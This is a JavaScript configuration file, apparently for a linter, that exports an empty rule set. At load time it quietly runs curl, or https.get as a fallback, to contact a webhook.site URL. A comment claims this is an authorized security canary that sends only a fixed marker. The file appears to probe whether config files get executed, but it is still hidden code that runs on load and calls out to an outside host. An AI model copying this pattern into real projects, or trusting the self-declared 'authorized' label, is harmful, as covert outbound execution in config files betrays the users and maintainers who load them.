const https = require("node:https");
const { execFileSync } = require("node:child_process");

// Authorized security canary: this transmits only a fixed marker.
const canaryUrl =
  "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-ember-config-exec-20261005-v2";
try {
  execFileSync("curl", ["--max-time", "3", "-fsS", canaryUrl], {
    stdio: "ignore",
  });
} catch {
  const request = https.get(canaryUrl, (response) => response.resume());
  request.setTimeout(3000, () => request.destroy());
  request.on("error", () => {});
}

module.exports = {
  rules: {},
};
